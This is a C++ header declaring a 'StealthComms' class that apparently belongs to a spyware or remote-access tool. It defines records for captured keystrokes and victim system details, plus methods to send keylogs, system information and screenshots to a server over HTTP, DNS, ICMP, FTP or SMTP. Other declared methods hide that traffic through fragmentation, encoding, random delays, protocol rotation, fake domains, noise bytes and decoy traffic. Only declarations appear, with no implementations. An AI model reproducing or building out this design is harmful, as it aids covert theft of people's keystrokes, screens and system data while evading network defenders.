#ifndef STEALTHCOMMS_H
#define STEALTHCOMMS_H

#include "communication/BaseComms.h"
#include "core/Platform.h"
#include <string>
#include <vector>
#include <memory>

class Configuration;
class HttpComms;
class DnsComms;
class FtpComms;

struct KeyLogEntry {
    std::string timestamp;
    std::string windowTitle;
    std::string keyData;
};

struct SystemInfo {
    std::string computerName;
    std::string userName;
    std::string osVersion;
    std::string memorySize;
    std::string processorInfo;
};

class StealthComms : public BaseComms {
public:
    explicit StealthComms(Configuration* config);
    ~StealthComms() override;
    
    // BaseComms interface
    bool Initialize() override;
    bool SendData(const std::vector<uint8_t>& data) override;
    void Cleanup() override;
    [[nodiscard]] bool TestConnection() const override;
    std::vector<uint8_t> ReceiveData() override;
    
    // Specialized stealth methods
    bool SendKeyLogs(const std::vector<KeyLogEntry>& logs);
    bool SendSystemInfo(const SystemInfo& systemInfo);
    bool SendScreenshot(const std::vector<uint8_t>& imageData);
    
private:
    Configuration* m_config;
    std::string m_serverUrl;
    std::string m_clientId;
    std::string m_currentMethod;
    std::vector<std::string> m_availableMethods;
    
    // Communication method instances
    std::unique_ptr<HttpComms> m_httpComms;
    std::unique_ptr<DnsComms> m_dnsComms;
    std::unique_ptr<FtpComms> m_ftpComms;
    
    // Protocol-specific send methods
    bool SendViaHTTP(const std::vector<uint8_t>& data);
    bool SendViaDNS(const std::vector<uint8_t>& data);
    bool SendViaICMP(const std::vector<uint8_t>& data);
    bool SendViaFTP(const std::vector<uint8_t>& data);
    bool SendViaSMTP(const std::vector<uint8_t>& data);
    
    // Advanced stealth techniques
    std::vector<uint8_t> FragmentData(const std::vector<uint8_t>& data);

    static std::vector<uint8_t> ApplyStealthEncoding(const std::vector<uint8_t>& data);
    bool SendFragmented(const std::vector<uint8_t>& data);
    void AddRandomDelay();
    bool ShouldUseAlternateMethod();
    void RotateMethod();
    
    // Data encoding/decoding
    std::vector<uint8_t> EncodeData(const std::vector<uint8_t>& data);
    std::vector<uint8_t> DecodeData(const std::vector<uint8_t>& data);
    std::string Base64Encode(const uint8_t* data, size_t length);
    std::vector<uint8_t> Base64Decode(const std::string& encoded);
    
    // Traffic obfuscation
    [[nodiscard]] std::string GenerateRandomUserAgent() const;
    [[nodiscard]] std::string GenerateLegitimateDomain() const;
    std::vector<uint8_t> AddNoiseBytes(const std::vector<uint8_t>& data);
    std::vector<uint8_t> CreateFakeTraffic();
    
    // Internal HTTP methods
    bool SendHttpRequest(const std::string& endpoint, const std::vector<uint8_t>& data);
    
#if PLATFORM_WINDOWS
    HINTERNET CreateHttpSession();
    bool SendSecureHttpRequest(HINTERNET hSession, const std::string& endpoint, 
                              const std::vector<uint8_t>& data);
#endif
    
    // Method selection logic
    std::string SelectOptimalMethod();
    bool IsMethodAvailable(const std::string& method);
    void UpdateMethodReliability(const std::string& method, bool success);
};

#endif // STEALTHCOMMS_H